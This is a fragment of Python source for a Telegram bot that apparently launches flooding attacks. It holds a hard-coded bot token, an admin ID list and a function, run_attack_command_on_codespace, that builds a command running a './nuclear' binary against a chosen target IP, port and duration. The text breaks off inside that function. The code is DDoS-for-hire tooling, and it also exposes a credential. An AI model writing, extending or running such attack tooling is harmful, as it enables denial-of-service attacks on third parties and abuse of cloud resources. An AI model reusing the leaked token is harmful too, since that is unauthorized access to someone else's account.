...
# Bot token
TOKEN = '7920066907:AAG8H3ISpyqkeaQcth32FySbHAM4b6j77yc'
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

# Admins list
ADMIN_IDS = [6395187566]  # Replace with actual admin user IDs
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./nuclear {target_ip} {target_port} {duration} 1024 1700"
    try:
